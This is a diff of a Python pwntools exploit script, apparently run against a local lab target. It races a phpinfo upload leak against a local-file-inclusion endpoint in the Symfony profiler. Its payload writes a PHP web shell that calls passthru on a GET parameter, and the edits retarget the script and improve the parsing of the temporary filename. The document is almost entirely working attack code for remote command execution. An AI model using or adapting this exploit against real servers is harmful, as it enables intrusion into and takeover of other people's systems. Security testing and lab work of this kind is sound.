@@ -3,10 +3,10 @@ import threading
 from pwn import *
 
 # Configuration variables
-HOST = "localhost"
-PORT = 80
+HOST = "127.0.0.1"
+PORT = 8088
 POOL_SIZE = 10
-MAX_ATTEMPTS = 1000
+MAX_ATTEMPTS = 100
 TAG = "Security Test"
 PAYLOAD = f"{TAG}\r\n<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r\n"
 BOUNDARY = "---------------------------7dbff1ded0714"
@@ -28,13 +28,19 @@ Host: {HOST}\r
 \r
 {REQ1_DATA}"""
 LFIREQ = "GET /app_dev.php/_profiler/open?file={} HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: {}\r\n\r\n"
-
 def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
     try:
         with remote(host, port) as s, remote(host, port) as s2:
             s.send(phpinforeq)
             d = s.recvn(offset).decode()
-            fn = d.split("[tmp_name] =&gt")[1][17:31]
+            match = re.search(r'\[tmp_name\] =&gt; (\/[^\s]+)', d)
+            if not match:
+                print("[DEBUG] No match found for tmp_name")
+                return None
+
+            fn = match.group(1)
+            print(f"[DEBUG] Extracted filename: {fn}")
+            
             s2.send(lfireq.format(fn, host))
             d = s2.recv(4096).decode()
             if tag in d:
